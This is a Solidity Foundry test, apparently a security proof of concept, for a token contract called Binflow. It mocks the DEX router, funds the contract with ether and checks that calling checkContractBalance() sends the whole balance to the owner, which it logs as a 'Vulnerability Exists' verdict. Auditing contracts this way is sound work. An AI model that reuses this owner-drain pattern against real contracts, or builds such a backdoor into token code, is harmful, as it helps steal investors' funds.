// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Binflow.sol";

contract MockRouter {
    function factory() public pure returns (address) {
        return address(0x1111111111111111111111111111111111111111);
    }
    function WETH() public pure returns (address) {
        return address(0x000000000000000000000000000000000000dEaD);
    }
}

contract MockFactory {
    function createPair(address, address) public pure returns (address) {
        return address(0x0000000000000000000000000000000000000001);
    }
}

contract BinflowTest is Test {
    Binflow token;
    address constant ROUTER_ADDRESS = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant FACTORY_ADDRESS = address(0x1111111111111111111111111111111111111111);
    
    function getBytecode(address _addr) public view returns (bytes memory o_code) {
        assembly {
            let size := extcodesize(_addr)
            o_code := mload(0x40)
            mstore(0x40, add(o_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
            mstore(o_code, size)
            extcodecopy(_addr, add(o_code, 0x20), 0, size)
        }
    }

    function setUp() public {
        MockRouter mockRouter = new MockRouter();
        MockFactory mockFactory = new MockFactory();
        
        vm.etch(ROUTER_ADDRESS, getBytecode(address(mockRouter)));
        vm.etch(FACTORY_ADDRESS, getBytecode(address(mockFactory)));
        
        token = new Binflow();
    }

    function testOwnerCanDrainContractBalance() public {
        uint256 ethAmount = 10 ether;
        (bool sent,) = address(token).call{value: ethAmount}("");
        require(sent, "ETH transfer failed");

        // Capture state BEFORE execution
        console.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(token).balance;
        address ownerAddr = token.firstOwner();
        uint256 ownerBalanceBefore = address(ownerAddr).balance;
        console.log("Contract ETH balance:", contractBalanceBefore);
        console.log("Owner ETH balance:", ownerBalanceBefore);

        console.log("--- Trigger checkContractBalance ---");
        token.checkContractBalance(); // Vulnerability trigger

        // Capture state AFTER execution
        console.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(token).balance;
        uint256 ownerBalanceAfter = address(ownerAddr).balance;
        console.log("Contract ETH balance:", contractBalanceAfter);
        console.log("Owner ETH balance:", ownerBalanceAfter);

        // Verify exploitation
        console.log("--- Verification ---");
        bool contractDrained = (contractBalanceAfter == 0);
        bool ownerGotFunds = (ownerBalanceAfter == ownerBalanceBefore + contractBalanceBefore);
        bool vulnerabilityExploited = contractDrained && ownerGotFunds;

        if (contractDrained) {
            console.log("Contract drained: YES (balance went from %s to 0)", contractBalanceBefore);
        } else {
            console.log("Contract drained: NO");
        }
        
        if (ownerGotFunds) {
            console.log("Owner received ETH: YES (+%s wei)", contractBalanceBefore);
        } else {
            console.log("Owner received ETH: NO (expected +%s, got +%s)", 
                contractBalanceBefore, 
                ownerBalanceAfter - ownerBalanceBefore);
        }

        // Final vulnerability verification
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Owner can drain ETH via checkContractBalance");
        } else {
            console.log("Vulnerability not Exist: Failed to drain contract ETH");
        }
    }

    receive() external payable {}
}